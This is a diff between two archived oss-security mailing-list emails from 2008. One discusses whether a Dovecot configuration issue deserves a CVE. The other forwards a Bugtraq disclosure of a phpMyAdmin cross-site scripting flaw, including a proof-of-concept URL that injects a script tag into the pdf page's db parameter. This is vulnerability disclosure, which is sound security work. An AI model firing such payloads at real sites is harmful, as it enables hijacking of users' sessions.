@@ -1,23 +1,68 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/03/08/1
-Message-ID: <877igd5jxs.fsf@mid.deneb.enyo.de>
-Date: Sat, 08 Mar 2008 16:12:15 +0100
-From: Florian Weimer <fw@...eb.enyo.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2008/10/27/5
+Message-Id: <200810280029.00376.hanno@hboeck.de>
+Date: Tue, 28 Oct 2008 00:28:59 +0200
+From: Hanno Böck <hanno@...eck.de>
 To: oss-security@...ts.openwall.com
-Cc: "Steven M. Christey" <coley@...us.mitre.org>,  tss@....fi
-Subject: Re: CVE? CCE? dovecot setting is often used incorrectly
+Cc: coley@...re.org
+Subject: CVE request phpmyadmin (Fwd: XSS in phpMyadmin)
 Content-Type: text/plain; charset=utf-8
 
-* Jonathan Smith:
+No fix yet, works also in 3.0.1.
 
-> I've been trying to figure out what to do with this one. I'm not
-> inclined to believe it deserves a CVE given that it is configuration
-> (either dovecot config or filesystem permissions configuration). I read
-> once on mitre.org about "Common Configuration Enumeration" aka "CCE"
-> issues, but I've never seen them actually used. Maybe this is a good
-> candidate?
+----------  Weitergeleitete Nachricht  ----------
 
-Debian will release a security update with a patch, so we need a CVE
-anyway.  We might use one from our pool (after all, it's an interplay
-between our default MTA and Dovecot, and may not be very widespread), or
-we might reference a generic one.  I don't know which one is better.
+Subject: XSS in phpMyadmin
+Date: Montag 27 Oktober 2008
+From: hadikiamarsi@...mail.com
+To: bugtraq@...urityfocus.com
+
+Author : Hadi Kiamarsi
+
+-------------------------------------------
+
+Discovered by : Hadi Kiamarsi
+
+-------------------------------------------
+
+Exploited By : Hadi Kiamarsi
+
+-------------------------------------------
+
+E-Mail : hadikiamarsi[at]hotmail.com
+
+-------------------------------------------
+
+web site : www.ircrash.com
+
+-------------------------------------------
+
+members team : Hadi Kiamarsi - khashayar fereidani - sina yazdanmehr
+
+-------------------------------------------
+
+Sript Name : phpmyadmin ( All version )
+
+Download Script : 
+http://prdownloads.sourceforge.net/phpmyadmin/phpMyAdmin-3.0.0-all-languages.zip?download
+
+-------------------------------------------
+
+XSS
+
+Exploit :
+
+register_globals=on
+
+query : 
+http://[www.example.com]/pmd_pdf.php?db=>"><script>alert('Hadi-Kiamarsi')</script>
+
+-------------------------------------------------------
+
+-- 
+Hanno Böck		Blog:		http://www.hboeck.de/
+GPG: 3DBD3B20		Jabber/Mail:	hanno@...eck.de
+
+http://x1000malquer.de/ - ab 8.11. Atomtransporte stoppen
+
+Download attachment "signature.asc " of type "application/pgp-signature" (198 bytes)
